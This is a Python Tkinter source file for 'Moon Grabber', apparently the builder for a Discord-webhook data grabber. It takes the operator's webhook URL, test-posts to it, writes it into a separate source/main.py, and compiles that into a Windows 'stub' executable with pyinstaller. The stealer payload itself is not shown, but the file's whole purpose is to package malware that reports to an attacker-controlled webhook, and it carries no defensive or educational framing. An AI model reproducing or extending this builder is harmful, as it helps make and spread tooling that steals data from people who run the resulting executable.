import tkinter as tk
from tkinter import messagebox
import requests
import codecs
import os

import platform

if platform.system() == "Windows":
    # If running on Windows, do nothing and continue with the program
    pass
else:
    # If not running on Windows, exit the program
    quit()


def test_webhook():
    webhook_url = webhook_entry.get()
    try:
        response = requests.post(
            webhook_url,
            json={"content": "Webhook is working on your server."})
        if response.status_code == 204:
            test_webhook_label.config(text="Webhook is valid", fg="#00FF00")
        else:
            test_webhook_label.config(text="Invalid webhook", fg="#FF0000")
    except:
        test_webhook_label.config(text="Invalid webhook", fg="#FF0000")
    print(response.status_code)


def build():
    search_text = "run builder py first"
    replace_text = webhook_entry.get()

    with codecs.open("source/main.py", "r", encoding="utf-8") as file:
        data = file.read()
        data = data.replace(search_text, replace_text)

    with codecs.open("source/main.py", "w", encoding="utf-8") as file:
        file.write(data)

    # check if the webhook is valid or invalid
    try:
        response = requests.post(webhook_entry.get(),
                                 json={"content": "Webhook test message."})
        if response.status_code == 204:

            messagebox.showinfo("Please wait", "Building stub...")

            os.system("pyinstaller --onefile source/main.py")

            messagebox.showinfo(
                "Done!",
                "Check the the folder this file is located in for a folder called dist. Thats where your stub is located."
            )

        else:
            messagebox.showerror("Error", "Invalid webhook.")

    except Exception as e:
        tk.messagebox.showerror("Error", f"Error: {str(e)}")


root = tk.Tk()
root.geometry("600x400")
root.title("Moon Grabber")
root.configure(bg="#2D3142")

title_label = tk.Label(root,
                       text="Moon Grabber",
                       font=("Arial", 24, "bold"),
                       bg="#2D3142",
                       fg="#F5D042")
title_label.pack(pady=(20, 10))

webhook_frame = tk.Frame(root, bg="#2D3142")
webhook_label = tk.Label(webhook_frame,
                         text="Webhook URL:",
                         font=("Arial", 14),
                         bg="#2D3142",
                         fg="#F5D042")
webhook_entry = tk.Entry(webhook_frame, width=40, font=("Arial", 14))
webhook_label.pack(side="left", padx=10, pady=10)
webhook_entry.pack(side="left", padx=10, pady=10)
webhook_frame.pack()

test_webhook_frame = tk.Frame(root, bg="#2D3142")
test_webhook_label = tk.Label(test_webhook_frame,
                              text="",
                              font=("Arial", 14),
                              bg="#2D3142",
                              fg="#F5D042")
test_webhook_label.pack(side="left", padx=10, pady=10)
test_webhook_frame.pack(pady=(10, 0))

button_frame = tk.Frame(root, bg="#2D3142")
build_button = tk.Button(button_frame,
                         text="Build",
                         font=("Arial", 14),
                         bg="#F5D042",
                         fg="#2D3142",
                         activebackground="#F5D042",
                         activeforeground="#2D3142",
                         command=build)
test_button = tk.Button(button_frame,
                        text="Test Webhook",
                        font=("Arial", 14),
                        bg="#F5D042",
                        fg="#2D3142",
                        activebackground="#F5D042",
                        activeforeground="#2D3142",
                        command=test_webhook)

build_button.pack(side="left", padx=10, pady=(30, 10))
test_button.pack(side="left", padx=10, pady=(30, 10))
button_frame.pack()

root.mainloop()
